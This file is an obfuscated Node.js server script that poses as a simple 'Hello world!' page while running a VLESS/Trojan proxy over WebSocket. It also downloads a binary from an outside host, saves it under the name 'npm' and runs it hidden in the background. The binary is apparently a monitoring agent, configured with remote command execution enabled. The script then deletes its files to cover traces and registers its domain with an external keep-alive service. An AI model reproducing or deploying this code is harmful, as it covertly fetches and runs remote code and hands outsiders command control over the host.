const _0x226600=_0x1e17;(function(_0x1d3d84,_0xb0d92a){const _0x5040e8=_0x1e17,_0x220ec2=_0x1d3d84();while(!![]){try{const _0x39d586=-parseInt(_0x5040e8(0x1ef))/0x1*(-parseInt(_0x5040e8(0x23c))/0x2)+parseInt(_0x5040e8(0x200))/0x3*(parseInt(_0x5040e8(0x21e))/0x4)+parseInt(_0x5040e8(0x1d2))/0x5+-parseInt(_0x5040e8(0x240))/0x6*(-parseInt(_0x5040e8(0x202))/0x7)+-parseInt(_0x5040e8(0x1f2))/0x8*(-parseInt(_0x5040e8(0x221))/0x9)+parseInt(_0x5040e8(0x22e))/0xa*(-parseInt(_0x5040e8(0x238))/0xb)+parseInt(_0x5040e8(0x1ff))/0xc*(-parseInt(_0x5040e8(0x22d))/0xd);if(_0x39d586===_0xb0d92a)break;else _0x220ec2['push'](_0x220ec2['shift']());}catch(_0x3c7fb3){_0x220ec2['push'](_0x220ec2['shift']());}}}(_0x3752,0x29d98));const os=require('os'),http=require(_0x226600(0x239)),fs=require('fs'),axios=require(_0x226600(0x227)),net=require(_0x226600(0x20e)),path=require(_0x226600(0x1f0)),crypto=require(_0x226600(0x1d6)),{Buffer}=require(_0x226600(0x1e3)),{exec,execSync}=require(_0x226600(0x1dc)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x226600(0x203)]['UUID']||_0x226600(0x1d4),NEZHA_SERVER=process[_0x226600(0x203)][_0x226600(0x210)]||'',NEZHA_PORT=process[_0x226600(0x203)][_0x226600(0x1ec)]||'',NEZHA_KEY=process['env'][_0x226600(0x220)]||'',DOMAIN=process[_0x226600(0x203)][_0x226600(0x1d0)]||_0x226600(0x20f),AUTO_ACCESS=process[_0x226600(0x203)][_0x226600(0x1d3)]||!![],WSPATH=process['env'][_0x226600(0x218)]||UUID[_0x226600(0x1fa)](0x0,0x8),SUB_PATH=process[_0x226600(0x203)]['SUB_PATH']||_0x226600(0x1cd),NAME=process['env']['NAME']||'Hug',PORT=process[_0x226600(0x203)][_0x226600(0x211)]||0x1eb4;function _0x3752(){const _0x1c5878=['https://speed.cloudflare.com/meta','8.8.4.4','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','concat','2053','application/dns-json','sub','arch','get','DOMAIN','Hello\x20world!','1132875UZyujK','AUTO_ACCESS','402fe1fd-c6a1-4c4c-8925-bbe42865f0ae','listen','crypto','close','/bin/bash','substr','utf-8','base64','child_process','stream','Unknown','false','error:\x20','https://arm64.ssss.nyc.mn/agent','\x20with\x20all\x20DNS\x20servers','buffer','npm\x20running\x20error:','config.yaml','npm\x20download\x20successfully','https://dns.google/resolve?name=','pipe','createServer','Failed\x20to\x20resolve\x20','asOrganization','NEZHA_PORT','443','npm','265499IlXTBm','path','hex','8IZgVmX','true','decode','map','write','country','Answer','arm64','slice','&path=%2F','test','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','2096','322236GrUfwF','70911DWCiVq','https://','49jCOBpJ','env','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','&fp=chrome&type=ws&host=','setsid\x20nohup\x20./npm\x20-s\x20','url',':443?security=tls&sni=','toString','update','message','8443','reduce','net','1234.abc.com','NEZHA_SERVER','PORT','&type=A','send','2087','error','readUInt8','sha224','WSPATH','find','catch','every','Not\x20Found\x0a','client_secret:\x20','8JxBkhI','utf8','NEZHA_KEY','309114cVeJOH','--tls','type','writeHead','readUInt16BE','log','axios','unlink','data','trojan://','text/html','https://amd64.ssss.nyc.mn/v1','234MeXRsh','10LuAwQh','digest','join','once','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','npm\x20is\x20running','Server\x20is\x20running\x20on\x20port\x20','\x20-p\x20','finish','createHash','548680WWqijG','http','text/plain','length','2BMELiE','end','application/json',':443?encryption=none&security=tls&sni=','112248vaXLjk','includes','2083','then','writeFileSync','connect'];_0x3752=function(){return _0x1c5878;};return _0x3752();}let ISP='';function _0x1e17(_0x5d8289,_0x5deb1e){const _0x37525a=_0x3752();return _0x1e17=function(_0x1e17b8,_0x12c7f6){_0x1e17b8=_0x1e17b8-0x1c3;let _0x4d7b42=_0x37525a[_0x1e17b8];return _0x4d7b42;},_0x1e17(_0x5d8289,_0x5deb1e);}const GetISP=async()=>{const _0x1191a2=_0x226600;try{const _0x1d14ca=await axios['get'](_0x1191a2(0x1c7)),_0x27c002=_0x1d14ca['data'];ISP=(_0x27c002[_0x1191a2(0x1f7)]+'-'+_0x27c002[_0x1191a2(0x1eb)])['replace'](/ /g,'_');}catch(_0x2ccc07){ISP=_0x1191a2(0x1de);}};GetISP();const httpServer=http[_0x226600(0x1e9)]((_0x4fed1f,_0x3c8872)=>{const _0xed68c5=_0x226600;if(_0x4fed1f[_0xed68c5(0x207)]==='/'){const _0x3e30e3=path[_0xed68c5(0x230)](__dirname,'index.html');fs['readFile'](_0x3e30e3,_0xed68c5(0x21f),(_0x2919f8,_0xc7e622)=>{const _0x689d61=_0xed68c5;if(_0x2919f8){_0x3c8872['writeHead'](0xc8,{'Content-Type':_0x689d61(0x22b)}),_0x3c8872[_0x689d61(0x23d)](_0x689d61(0x1d1));return;}_0x3c8872[_0x689d61(0x224)](0xc8,{'Content-Type':'text/html'}),_0x3c8872[_0x689d61(0x23d)](_0xc7e622);});return;}else{if(_0x4fed1f[_0xed68c5(0x207)]==='/'+SUB_PATH){const _0x27da1f='vless://'+UUID+'@'+DOMAIN+_0xed68c5(0x23f)+DOMAIN+_0xed68c5(0x205)+DOMAIN+_0xed68c5(0x1fb)+WSPATH+'#'+NAME+'-'+ISP,_0x4aed20=_0xed68c5(0x22a)+UUID+'@'+DOMAIN+_0xed68c5(0x208)+DOMAIN+_0xed68c5(0x205)+DOMAIN+_0xed68c5(0x1fb)+WSPATH+'#'+NAME+'-'+ISP,_0x3712b6=_0x27da1f+'\x0a'+_0x4aed20,_0x2cf4e2=Buffer['from'](_0x3712b6)[_0xed68c5(0x209)](_0xed68c5(0x1db));_0x3c8872[_0xed68c5(0x224)](0xc8,{'Content-Type':_0xed68c5(0x23a)}),_0x3c8872['end'](_0x2cf4e2+'\x0a');}else _0x3c8872['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x3c8872['end'](_0xed68c5(0x21c));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x226600(0x1c8),'1.1.1.1'];function resolveHost(_0x486178){return new Promise((_0x372b26,_0x5133fc)=>{const _0x17b64b=_0x1e17;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x17b64b(0x1fc)](_0x486178)){_0x372b26(_0x486178);return;}let _0x369213=0x0;function _0x1796b1(){const _0x3965a2=_0x17b64b;if(_0x369213>=DNS_SERVERS['length']){_0x5133fc(new Error(_0x3965a2(0x1ea)+_0x486178+_0x3965a2(0x1e2)));return;}const _0x3e8f9b=DNS_SERVERS[_0x369213];_0x369213++;const _0x18ff9c=_0x3965a2(0x1e7)+encodeURIComponent(_0x486178)+_0x3965a2(0x212);axios[_0x3965a2(0x1cf)](_0x18ff9c,{'timeout':0x1388,'headers':{'Accept':_0x3965a2(0x1cc)}})[_0x3965a2(0x1c4)](_0xeda124=>{const _0x4680d9=_0x3965a2,_0x5122db=_0xeda124[_0x4680d9(0x229)];if(_0x5122db['Status']===0x0&&_0x5122db[_0x4680d9(0x1f8)]&&_0x5122db[_0x4680d9(0x1f8)]['length']>0x0){const _0xbbb307=_0x5122db[_0x4680d9(0x1f8)][_0x4680d9(0x219)](_0x116ea4=>_0x116ea4[_0x4680d9(0x223)]===0x1);if(_0xbbb307){_0x372b26(_0xbbb307[_0x4680d9(0x229)]);return;}}_0x1796b1();})[_0x3965a2(0x21a)](_0x2faf5a=>{_0x1796b1();});}_0x1796b1();});}function handleVlessConnection(_0x14e167,_0x855040){const _0x299eac=_0x226600,[_0x2a5460]=_0x855040,_0x3296af=_0x855040[_0x299eac(0x1fa)](0x1,0x11);if(!_0x3296af[_0x299eac(0x21b)]((_0x3dbb09,_0x19bd0d)=>_0x3dbb09==parseInt(uuid[_0x299eac(0x1d9)](_0x19bd0d*0x2,0x2),0x10)))return![];let _0x5aaa6e=_0x855040[_0x299eac(0x1fa)](0x11,0x12)[_0x299eac(0x216)]()+0x13;const _0x2b97aa=_0x855040[_0x299eac(0x1fa)](_0x5aaa6e,_0x5aaa6e+=0x2)['readUInt16BE'](0x0),_0x1bcb49=_0x855040[_0x299eac(0x1fa)](_0x5aaa6e,_0x5aaa6e+=0x1)[_0x299eac(0x216)](),_0x3acfed=_0x1bcb49==0x1?_0x855040[_0x299eac(0x1fa)](_0x5aaa6e,_0x5aaa6e+=0x4)[_0x299eac(0x230)]('.'):_0x1bcb49==0x2?new TextDecoder()[_0x299eac(0x1f4)](_0x855040[_0x299eac(0x1fa)](_0x5aaa6e+0x1,_0x5aaa6e+=0x1+_0x855040[_0x299eac(0x1fa)](_0x5aaa6e,_0x5aaa6e+0x1)[_0x299eac(0x216)]())):_0x1bcb49==0x3?_0x855040['slice'](_0x5aaa6e,_0x5aaa6e+=0x10)[_0x299eac(0x20d)]((_0x23c047,_0x476bf,_0x173597,_0x13f578)=>_0x173597%0x2?_0x23c047[_0x299eac(0x1ca)](_0x13f578[_0x299eac(0x1fa)](_0x173597-0x1,_0x173597+0x1)):_0x23c047,[])[_0x299eac(0x1f5)](_0x43b9fc=>_0x43b9fc[_0x299eac(0x225)](0x0)[_0x299eac(0x209)](0x10))['join'](':'):'';_0x14e167[_0x299eac(0x213)](new Uint8Array([_0x2a5460,0x0]));const _0x38049c=createWebSocketStream(_0x14e167);return resolveHost(_0x3acfed)[_0x299eac(0x1c4)](_0x18f327=>{const _0x26a722=_0x299eac;net[_0x26a722(0x1c6)]({'host':_0x18f327,'port':_0x2b97aa},function(){const _0x2e01eb=_0x26a722;this['write'](_0x855040[_0x2e01eb(0x1fa)](_0x5aaa6e)),_0x38049c['on']('error',()=>{})[_0x2e01eb(0x1e8)](this)['on'](_0x2e01eb(0x215),()=>{})[_0x2e01eb(0x1e8)](_0x38049c);})['on']('error',()=>{});})['catch'](_0x373de6=>{const _0x597841=_0x299eac;net[_0x597841(0x1c6)]({'host':_0x3acfed,'port':_0x2b97aa},function(){const _0x129750=_0x597841;this[_0x129750(0x1f6)](_0x855040[_0x129750(0x1fa)](_0x5aaa6e)),_0x38049c['on'](_0x129750(0x215),()=>{})[_0x129750(0x1e8)](this)['on'](_0x129750(0x215),()=>{})['pipe'](_0x38049c);})['on'](_0x597841(0x215),()=>{});}),!![];}function handleTrojanConnection(_0x38e298,_0x36f9b8){const _0x522a2c=_0x226600;try{if(_0x36f9b8[_0x522a2c(0x23b)]<0x3a)return![];const _0x3f453c=_0x36f9b8['slice'](0x0,0x38)[_0x522a2c(0x209)](),_0x4f196f=[UUID];let _0x187d68=null;for(const _0x3c4348 of _0x4f196f){const _0x4f806e=crypto[_0x522a2c(0x237)](_0x522a2c(0x217))[_0x522a2c(0x20a)](_0x3c4348)[_0x522a2c(0x22f)](_0x522a2c(0x1f1));if(_0x4f806e===_0x3f453c){_0x187d68=_0x3c4348;break;}}if(!_0x187d68)return![];let _0x5d7170=0x38;_0x36f9b8[_0x5d7170]===0xd&&_0x36f9b8[_0x5d7170+0x1]===0xa&&(_0x5d7170+=0x2);const _0x1bb7b4=_0x36f9b8[_0x5d7170];if(_0x1bb7b4!==0x1)return![];_0x5d7170+=0x1;const _0x46e964=_0x36f9b8[_0x5d7170];_0x5d7170+=0x1;let _0x3d1616,_0x58d1e3;if(_0x46e964===0x1)_0x3d1616=_0x36f9b8[_0x522a2c(0x1fa)](_0x5d7170,_0x5d7170+0x4)[_0x522a2c(0x230)]('.'),_0x5d7170+=0x4;else{if(_0x46e964===0x3){const _0x4fefaf=_0x36f9b8[_0x5d7170];_0x5d7170+=0x1,_0x3d1616=_0x36f9b8[_0x522a2c(0x1fa)](_0x5d7170,_0x5d7170+_0x4fefaf)[_0x522a2c(0x209)](),_0x5d7170+=_0x4fefaf;}else{if(_0x46e964===0x4)_0x3d1616=_0x36f9b8[_0x522a2c(0x1fa)](_0x5d7170,_0x5d7170+0x10)[_0x522a2c(0x20d)]((_0x1f002d,_0x260f78,_0x23a692,_0x5e3c97)=>_0x23a692%0x2?_0x1f002d[_0x522a2c(0x1ca)](_0x5e3c97[_0x522a2c(0x1fa)](_0x23a692-0x1,_0x23a692+0x1)):_0x1f002d,[])[_0x522a2c(0x1f5)](_0x281e2a=>_0x281e2a[_0x522a2c(0x225)](0x0)[_0x522a2c(0x209)](0x10))[_0x522a2c(0x230)](':'),_0x5d7170+=0x10;else return![];}}_0x58d1e3=_0x36f9b8[_0x522a2c(0x225)](_0x5d7170),_0x5d7170+=0x2;_0x5d7170<_0x36f9b8[_0x522a2c(0x23b)]&&_0x36f9b8[_0x5d7170]===0xd&&_0x36f9b8[_0x5d7170+0x1]===0xa&&(_0x5d7170+=0x2);const _0x2ba401=createWebSocketStream(_0x38e298);return resolveHost(_0x3d1616)['then'](_0x326c87=>{const _0x57f6fe=_0x522a2c;net['connect']({'host':_0x326c87,'port':_0x58d1e3},function(){const _0x11428d=_0x1e17;_0x5d7170<_0x36f9b8[_0x11428d(0x23b)]&&this[_0x11428d(0x1f6)](_0x36f9b8['slice'](_0x5d7170)),_0x2ba401['on'](_0x11428d(0x215),()=>{})[_0x11428d(0x1e8)](this)['on'](_0x11428d(0x215),()=>{})[_0x11428d(0x1e8)](_0x2ba401);})['on'](_0x57f6fe(0x215),()=>{});})[_0x522a2c(0x21a)](_0x3a5651=>{const _0x54070f=_0x522a2c;net[_0x54070f(0x1c6)]({'host':_0x3d1616,'port':_0x58d1e3},function(){const _0x3b4032=_0x54070f;_0x5d7170<_0x36f9b8[_0x3b4032(0x23b)]&&this[_0x3b4032(0x1f6)](_0x36f9b8[_0x3b4032(0x1fa)](_0x5d7170)),_0x2ba401['on'](_0x3b4032(0x215),()=>{})['pipe'](this)['on'](_0x3b4032(0x215),()=>{})[_0x3b4032(0x1e8)](_0x2ba401);})['on'](_0x54070f(0x215),()=>{});}),!![];}catch(_0x18222d){return![];}}wss['on']('connection',(_0x4143f0,_0x54c67a)=>{const _0x5c3308=_0x226600,_0x30bc8e=_0x54c67a[_0x5c3308(0x207)]||'';_0x4143f0[_0x5c3308(0x231)](_0x5c3308(0x20b),_0x49b5b4=>{const _0x3b1f2e=_0x5c3308;if(_0x49b5b4[_0x3b1f2e(0x23b)]>0x11&&_0x49b5b4[0x0]===0x0){const _0x3999da=_0x49b5b4[_0x3b1f2e(0x1fa)](0x1,0x11),_0x1a566c=_0x3999da['every']((_0x1b6e87,_0x55b800)=>_0x1b6e87==parseInt(uuid[_0x3b1f2e(0x1d9)](_0x55b800*0x2,0x2),0x10));if(_0x1a566c){!handleVlessConnection(_0x4143f0,_0x49b5b4)&&_0x4143f0[_0x3b1f2e(0x1d7)]();return;}}!handleTrojanConnection(_0x4143f0,_0x49b5b4)&&_0x4143f0[_0x3b1f2e(0x1d7)]();})['on'](_0x5c3308(0x215),()=>{});});const getDownloadUrl=()=>{const _0x5384ff=_0x226600,_0x42d22a=os[_0x5384ff(0x1ce)]();return _0x42d22a==='arm'||_0x42d22a===_0x5384ff(0x1f9)||_0x42d22a==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x5384ff(0x1e1):!NEZHA_PORT?_0x5384ff(0x22c):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x577300=_0x226600;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x29174c=getDownloadUrl(),_0x468e09=await axios({'method':'get','url':_0x29174c,'responseType':_0x577300(0x1dd)}),_0x10afa6=fs['createWriteStream'](_0x577300(0x1ee));return _0x468e09[_0x577300(0x229)]['pipe'](_0x10afa6),new Promise((_0x458bd1,_0x258816)=>{const _0x2b4b48=_0x577300;_0x10afa6['on'](_0x2b4b48(0x236),()=>{const _0x3c1f97=_0x2b4b48;console[_0x3c1f97(0x226)](_0x3c1f97(0x1e6)),exec('chmod\x20+x\x20npm',_0x354aae=>{if(_0x354aae)_0x258816(_0x354aae);_0x458bd1();});}),_0x10afa6['on'](_0x2b4b48(0x215),_0x258816);});}catch(_0x2ee962){throw _0x2ee962;}},runnz=async()=>{const _0x577200=_0x226600;try{const _0xe10bc5=execSync(_0x577200(0x1fd),{'encoding':_0x577200(0x1da)});if(_0xe10bc5['trim']()!==''){console[_0x577200(0x226)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x473848){}await downloadFile();let _0x18fdca='',_0x2c9382=[_0x577200(0x1ed),_0x577200(0x20c),_0x577200(0x1fe),_0x577200(0x214),_0x577200(0x1c3),_0x577200(0x1cb)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x154873=_0x2c9382[_0x577200(0x241)](NEZHA_PORT)?_0x577200(0x222):'';_0x18fdca=_0x577200(0x206)+NEZHA_SERVER+':'+NEZHA_PORT+_0x577200(0x235)+NEZHA_KEY+'\x20'+_0x154873+_0x577200(0x204);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x446137=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x3dcc9f=_0x2c9382['includes'](_0x446137)?_0x577200(0x1f3):_0x577200(0x1df),_0x4e7628=_0x577200(0x21d)+NEZHA_KEY+_0x577200(0x232)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x3dcc9f+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x577200(0x1c5)](_0x577200(0x1e5),_0x4e7628);}_0x18fdca=_0x577200(0x1c9);}else{console[_0x577200(0x226)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x18fdca,{'shell':_0x577200(0x1d8)},_0xb7e29f=>{const _0x59f830=_0x577200;if(_0xb7e29f)console[_0x59f830(0x215)](_0x59f830(0x1e4),_0xb7e29f);else console[_0x59f830(0x226)](_0x59f830(0x233));});}catch(_0x3e92e3){console[_0x577200(0x215)](_0x577200(0x1e0)+_0x3e92e3);}};async function addAccessTask(){const _0x47c035=_0x226600;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4e460e=_0x47c035(0x201)+DOMAIN;try{const _0x1ff1ec=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x4e460e},{'headers':{'Content-Type':_0x47c035(0x23e)}});console[_0x47c035(0x226)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x4d2a08){}}const delFiles=()=>{const _0x3579ae=_0x226600;fs['unlink']('npm',()=>{}),fs[_0x3579ae(0x228)](_0x3579ae(0x1e5),()=>{});};httpServer[_0x226600(0x1d5)](PORT,()=>{const _0x4a94be=_0x226600;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x4a94be(0x226)](_0x4a94be(0x234)+PORT);});
